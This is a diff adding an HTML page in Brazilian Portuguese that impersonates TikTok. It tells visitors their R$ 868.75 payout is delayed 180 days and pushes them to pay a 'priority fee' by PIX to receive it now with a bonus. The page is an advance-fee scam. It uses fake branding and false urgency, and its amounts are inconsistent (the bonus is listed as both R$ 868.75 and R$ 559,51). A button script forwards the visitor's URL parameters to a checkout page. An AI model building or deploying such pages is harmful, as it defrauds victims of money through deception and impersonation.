@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<script src="/params.js"></script>
+<script src="/api/tt.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok - Antecipação Prioritária</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap');
+        body { font-family: 'Inter', sans-serif; letter-spacing: -0.02em; background-color: #ffffff; }
+        
+        /* Relógio Estilo TikTok */
+        .clock-base {
+            width: 80px;
+            height: 80px;
+            border: 6px solid #161823;
+            border-radius: 50%;
+            position: relative;
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+        .clock-center {
+            width: 8px;
+            height: 8px;
+            background: #FE2C55;
+            border-radius: 50%;
+            z-index: 10;
+        }
+        .hand {
+            position: absolute;
+            background: #161823;
+            border-radius: 10px;
+            transform-origin: bottom center;
+            bottom: 50%;
+            left: calc(50% - 2px);
+        }
+        .hour-hand {
+            width: 4px;
+            height: 20px;
+            animation: rotate-clock 12s linear infinite;
+        }
+        .minute-hand {
+            width: 3px;
+            height: 28px;
+            animation: rotate-clock 2s linear infinite;
+            background: #FE2C55;
+        }
+        @keyframes rotate-clock {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        
+        .btn-tiktok {
+            background-color: #FE2C55;
+            transition: all 0.2s ease;
+        }
+        .btn-tiktok:active { transform: scale(0.96); }
+
+        .premium-card {
+            background: linear-gradient(135deg, #161823 0%, #292d3e 100%);
+        }
+        
+        details summary::-webkit-details-marker { display: none; }
+    </style>
+</head>
+<body class="text-[#161823]">
+
+    <div class="bg-black text-white text-center py-3 px-4 text-[12px] font-bold uppercase tracking-tight leading-tight w-full sticky top-0 z-50">
+       O valor será creditado no prazo de até 180 dias. Recomendamos a antecipação para evitar a possibilidade de perda da vaga!  
+    </div>
+
+    <div class="max-w-md mx-auto min-h-screen relative bg-white pb-10">
+        
+        <div class="flex flex-col items-center px-5 py-8 border-b border-gray-50">
+            <img src="https://images.seeklogo.com/logo-png/37/2/tiktok-app-logo-png_seeklogo-375617.png" alt="TikTok" class="h-20 w-20 object-contain mb-4">
+            <div class="text-center">
+                <span class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Saldo em Processamento</span>
+                <span class="block text-4xl font-black text-[#161823] leading-none tracking-tighter">R$ 868.75</span>
+            </div>
+        </div>
+
+        <div class="px-5 py-8">
+            <div class="text-center mb-8">
+                <h1 class="text-2xl font-black text-slate-800 mb-2 italic text-center">SAQUE SOLICITADO!</h1>
+                <p class="text-sm text-gray-500 font-medium mb-6">Prazo de processamento bancário: 180 dias.</p>
+                
+                <div class="flex justify-center items-center mb-6">
+                    <div class="clock-base">
+                        <div class="clock-center"></div>
+                        <div class="hand hour-hand"></div>
+                        <div class="hand minute-hand"></div>
+                    </div>
+                </div>
+                
+                <p class="text-[12px] font-black text-[#FE2C55] uppercase tracking-widest animate-pulse">Vaga de Antecipação Prioritária Disponível</p>
+            </div>
+
+            <div class="space-y-6">
+                <div class="bg-gray-50 border-l-4 border-[#25F4EE] p-5 rounded-r-lg shadow-sm">
+                    <p class="text-[15px] text-gray-800 leading-relaxed text-center">
+                        ⚡ <strong>BÔNUS EXCLUSIVO:</strong> Antecipe seu saque agora e receba um adicional de <strong class="text-[#FE2C55]">R$ 868.75</strong> direto no seu PIX hoje!
+                    </p>
+                </div>
+
+                <a href="#" onclick="irParaCheckout(event)" class="btn-tiktok block w-full text-white text-center py-5 rounded-2xl shadow-xl transition-all active:scale-95">
+                    <span class="block font-[900] text-xl uppercase leading-none">ANTECIPAR E RECEBER TUDO</span>
+                    <span class="block font-medium text-sm opacity-90 mt-1 uppercase tracking-tighter">Receber R$ 1.428,26 Agora</span>
+                </a>
+
+                <div class="border-2 border-[#161823] rounded-3xl p-6 bg-white shadow-sm mt-8">
+                    <div class="space-y-3 mb-6 px-1">
+                        <div class="flex justify-between text-[13px]">
+                            <span class="text-gray-500">Saque padrão:</span>
+                            <span class="font-bold">R$ 868.75</span>
+                        </div>
+                        <div class="flex justify-between text-[13px]">
+                            <span class="text-green-600 font-bold">Bônus de Antecipação:</span>
+                            <span class="text-green-600 font-bold">+ R$ 559,51</span>
+                        </div>
+                        <div class="flex justify-between text-[13px] pt-2 border-t border-gray-100">
+                            <span class="text-gray-500 italic">Taxa de Prioridade:</span>
+                            <span class="font-bold text-[#FE2C55]">R$ 24,35</span>
+                        </div>
+                    </div>
+                    
+                    <div class="border border-gray-100 rounded-2xl p-5 flex flex-col items-center bg-gray-50">
+                        <span class="text-[11px] uppercase font-black text-gray-400 mb-1 text-center">Total a receber no PIX hoje:</span>
+                        <span class="text-4xl font-[900] text-[#161823] tracking-tighter text-center">R$ 1.428,26</span>
+                        <div class="mt-2 text-[10px] text-[#25F4EE] font-black tracking-widest uppercase text-center leading-tight bg-black px-3 py-1 rounded-full">Envio Imediato Liberado</div>
+                    </div>
+                </div>
+
+                <div class="premium-card rounded-3xl p-6 shadow-lg">
+                    <div class="flex items-center justify-between mb-2">
+                        <span class="text-[10px] font-black text-white/60 uppercase tracking-widest">Verificado pelo TikTok Ads</span>
+                        <div class="bg-white/10 px-2 py-1 rounded-md text-[9px] font-bold text-white uppercase">v9.2 Beta</div>
+                    </div>
+                    <div class="flex flex-col items-center py-2">
+                        <span class="text-4xl font-black text-white tracking-tighter">TikTok Bônus</span>
+                        <p class="text-[11px] font-bold text-white/70 mt-1 uppercase text-center leading-tight">Valor total disponível para envio prioritário</p>
+                    </div>
+                    <div class="w-full bg-white/10 h-[1px] my-3"></div>
+                    <p class="text-[9px] text-center text-white/50 font-medium italic">A liberação ocorre em até 5 minutos após a confirmação da taxa de prioridade.</p>
+                </div>
+            </div>
+
+            <div class="mt-10 space-y-3 text-center">
+                <p class="text-[11px] text-gray-400 font-bold uppercase tracking-widest">Dúvidas Frequentes</p>
+                <details class="group bg-gray-50 rounded-xl border border-gray-100 text-left">
+                    <summary class="flex justify-between items-center p-4 cursor-pointer font-bold text-sm">
+                        Por que antecipar meu saque?
+                        <span class="text-[#FE2C55] group-open:rotate-45 transition-transform text-xl">+</span>
+                    </summary>
+                    <div class="px-4 pb-4 text-sm text-gray-500 leading-relaxed">
+                        Ao antecipar, você sai da fila de espera bancária de 180 dias e recebe o bônus de R$ 868.75 que é limitado aos primeiros participantes da campanha.
+                    </div>
+                </details>
+            </div>
+        </div>
+
+        <footer class="py-10 text-center text-[10px] text-gray-300 font-bold uppercase tracking-[0.3em]">
+            TikTok Financial © 2026
+        </footer>
+    </div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script src="pix-modal.js"></script>
+<script>
+function irParaCheckout(event) {
+  event.preventDefault();
+  var dest = new URL('checkout.html', window.location.href);
+  new URLSearchParams(window.location.search).forEach(function(v, k) {
+    dest.searchParams.set(k, v);
+  });
+  window.location.href = dest.toString();
+}
+</script>
+
+</body>
+</html>c
